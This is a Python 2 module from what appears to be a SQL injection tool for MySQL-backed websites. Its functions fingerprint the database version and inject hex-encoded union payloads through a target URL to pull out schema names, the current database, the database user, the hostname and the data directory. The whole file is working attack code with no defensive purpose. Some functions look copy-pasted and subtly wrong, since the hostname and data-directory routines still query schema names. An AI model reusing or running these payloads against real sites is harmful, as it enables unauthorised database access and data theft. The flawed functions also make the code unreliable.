from requests import get_the_page
import s_data
from prints import print_cols_tables

def version(site):
    the_page = get_the_page(site,"1")
    versions = ["5.5.46","5.0.96",'5.5.40','5.1.60','5.5.33','5.0.83','5.2.12','5.1.72',"5.5.30","5.1.41","5.1.61","5.0.96","5.1.66","5.1.56","5.1.73","5.5.38","5.1.72","5.5.36","5.5.37","5.1.57","5.5.35"]
    flag = 1
    flag1 = 1
    index = 0
    for index in versions:
        if index in the_page:
            return index

    if flag:
        for i in range (0,10):
            if "5.%d." %i in the_page:
                return "5.%d" %i
         
    if flag1:
        print "Could not get the DB version."
        print "Maybe MySQL version<5 so we can` go further more"
        print "Program will exit"
        exit()



    
def names(site):
    site = site.replace("@@version","unhex(hex(group_concat(0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,schema_name,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e)))")
    site = site.replace("--","+from+information_schema.schemata--")
    the_page = get_the_page(site,"2")
    db_names = s_data.search_for(the_page)
    return(db_names)

def host_name(site):
    site = site.replace("@@hostname","unhex(hex(group_concat(0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,schema_name,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e)))")
    site = site.replace("--","+from+information_schema.schemata--")
    the_page = get_the_page(site,"2")
    host_name = s_data.search_for(the_page)
    print host_name
    return(host_name)

def loc_db_files(site):
    site = site.replace("@@datadir","unhex(hex(group_concat(0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,schema_name,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e)))")
    site = site.replace("--","+from+information_schema.schemata--")
    the_page = get_the_page(site,"2")
    directory = s_data.search_for(the_page)
    print directory
    return(directory)


def working_db(site):
    site = site.replace("@@version","unhex(hex(group_concat(0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,database(),0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e)))")
    the_page = get_the_page(site,"2")
    db = s_data.search_for(the_page)
    return db[0]

def user(site):
    site = site.replace("@@version","unhex(hex(group_concat(0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,user(),0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e)))")
    the_page = get_the_page(site,"2")
    user = s_data.search_for(the_page)
    return user[0]
    
